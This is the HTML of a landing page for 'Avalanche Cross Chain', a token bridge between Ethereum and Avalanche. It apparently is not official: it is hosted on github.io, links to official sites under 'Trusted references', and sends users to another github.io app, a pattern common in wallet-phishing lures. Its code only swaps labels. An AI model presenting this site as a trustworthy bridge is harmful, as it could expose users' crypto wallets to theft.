<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Avalanche Cross Chain</title>
  <meta name="description" content="Avalanche Cross Chain moves tokens between Ethereum, Avalanche and other networks from your own wallet.">
  <link rel="canonical" href="https://avalanche-cross-chain-bridge.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F7F6F4">
  <meta property="og:type" content="website">
  <meta property="og:title" content="Avalanche Cross Chain">
  <meta property="og:description" content="Avalanche Cross Chain moves tokens between Ethereum, Avalanche and other networks from your own wallet.">
  <meta property="og:url" content="https://avalanche-cross-chain-bridge.github.io/">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Avalanche Cross Chain">
  <meta name="twitter:description" content="Avalanche Cross Chain moves tokens between Ethereum, Avalanche and other networks from your own wallet.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://avalanche-cross-chain-bridge.github.io/#website",
        "url": "https://avalanche-cross-chain-bridge.github.io/",
        "name": "Avalanche Cross Chain",
        "inLanguage": "en"
      },
      {
        "@type": "WebApplication",
        "@id": "https://avalanche-cross-chain-bridge.github.io/#app",
        "name": "Avalanche Cross Chain",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://avalanche-cross-chain-bridge.github.io/",
        "offers": {
          "@type": "Offer",
          "price": "0",
          "priceCurrency": "USD"
        }
      },
      {
        "@type": "Organization",
        "@id": "https://avalanche-cross-chain-bridge.github.io/#organization",
        "name": "Avalanche Cross Chain",
        "url": "https://avalanche-cross-chain-bridge.github.io/",
        "logo": "https://avalanche-cross-chain-bridge.github.io/favicon.png"
      }
    ]
  }
  </script>
</head>
<body>
  <header class="topbar">
    <a class="brand" href="#" aria-label="Avalanche Cross Chain home">
      <img src="favicon.png" width="28" height="28" alt="">
      <span>Avalanche Cross Chain</span>
    </a>
    <nav class="nav" aria-label="Trusted references">
      <a href="https://snowtrace.io/" target="_blank" rel="nofollow noopener noreferrer">Snowtrace</a>
      <a href="https://www.avax.network/" target="_blank" rel="nofollow noopener noreferrer">Avalanche</a>
      <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Bridge guide</a>
    </nav>
    <span class="spacer"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-label="Avalanche Cross Chain">
      <h1>Avalanche Cross Chain</h1>
      <p class="sub"><strong>Avalanche Cross Chain</strong> moves tokens between Ethereum, Avalanche and other networks from your own wallet.</p>
    </section>

    <section class="app-card" aria-label="Cross-chain bridge route">
      <div class="route">
        <div class="leg">
          <span class="label">From</span>
          <span class="chip">
            <img src="eth.png" width="30" height="30" alt="Ethereum">
            <span>Ethereum</span>
          </span>
        </div>
        <button class="switch" type="button" data-switch aria-label="Switch bridge direction">
          <span aria-hidden="true">→</span>
        </button>
        <div class="leg">
          <span class="label">To</span>
          <span class="chip">
            <img src="avax.png" width="30" height="30" alt="Avalanche">
            <span>Avalanche</span>
          </span>
        </div>
      </div>
      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
    </section>
  </main>

  <footer class="foot">Avalanche Cross Chain — 2026</footer>

  <script>
  (function () {
    "use strict";
    var button = document.querySelector("[data-switch]");
    if (!button) return;

    button.addEventListener("click", function () {
      var chips = document.querySelectorAll(".leg .chip");
      if (chips.length !== 2) return;

      var first = chips[0].innerHTML;
      chips[0].innerHTML = chips[1].innerHTML;
      chips[1].innerHTML = first;
      button.classList.toggle("is-swapped");
    });
  })();
  </script>
</body>
</html>
